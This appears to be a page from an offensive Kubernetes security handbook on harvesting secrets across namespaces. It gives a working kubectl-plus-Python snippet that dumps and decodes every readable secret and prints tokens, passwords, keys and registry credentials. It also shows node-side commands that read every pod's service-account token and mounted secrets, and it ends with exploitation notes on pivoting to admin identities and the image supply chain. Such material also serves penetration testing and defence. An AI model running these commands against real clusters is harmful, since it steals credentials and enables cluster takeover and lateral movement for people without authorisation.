---
title: "Token and secret theft: harvesting credentials across namespaces"
order: 1
description: "Kubernetes secrets hold service-account tokens, registry credentials, TLS keys, and application passwords. An identity that can read secrets, or that reaches them through etcd or node access, harvests them across namespaces to collect tokens for more privileged identities and credentials for backend systems, fuelling further lateral movement."
keywords:
  - secret theft
  - service account token
  - cross-namespace
  - credentials
  - lateral movement
---

# Token and secret theft

Secrets are where Kubernetes concentrates credentials: service-account tokens, image-pull credentials, TLS private keys, and whatever applications store there such as database and cloud passwords. Harvesting them is the fuel for lateral movement, because a secret read in one namespace frequently contains a token for a more privileged identity or the password to a backend that leads elsewhere. The access can come from the API (with secret-read rights), from etcd, or from a node.

```bash
# via the API, across every namespace the identity can read
kubectl get secrets -A -o json > secrets.json
python3 - <<'PY'
import json,base64
for s in json.load(open("secrets.json"))["items"]:
    ns=s["metadata"]["namespace"]; nm=s["metadata"]["name"]; t=s.get("type","")
    for k,v in (s.get("data") or {}).items():
        try: val=base64.b64decode(v).decode("utf-8","replace")
        except Exception: continue
        if k=="token" or any(x in k.lower() for x in ("pass","key","secret",".dockerconfigjson")):
            print(ns, nm, t, k, "=", val[:70])
PY
```

## Other sources of the same secrets

```bash
# from a node: every pod's projected token and mounted secrets
cat /var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token 2>/dev/null
find /var/lib/kubelet/pods -path '*kubernetes.io~secret*' -type f 2>/dev/null
# from etcd: the raw store, bypassing RBAC entirely (see the etcd page)
```

## Exploitation notes

- Prioritise `token`-keyed and `kubernetes.io/service-account-token` secrets: each is a usable identity, and one bound to an admin role is cluster compromise; decode and test with `auth can-i --list`.
- `.dockerconfigjson` secrets are registry credentials that pivot into the image supply chain; TLS secrets expose private keys for cluster services.
- Cross-namespace read is the force multiplier; a role that allows `get secrets` cluster-wide turns this into harvesting every identity at once, see [Over-permissive roles](../rbac-privilege-escalation/over-permissive-roles.md).
- Node and etcd access expose the same secrets without API rights; see [Kubelet credential theft](../pod-escape-to-node/kubelet-credential-theft.md) and [etcd](../exposed-components/etcd.md).

## References

- [Kubernetes: secrets](https://kubernetes.io/docs/concepts/configuration/secret/)
- [HackTricks: Kubernetes secrets](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security)
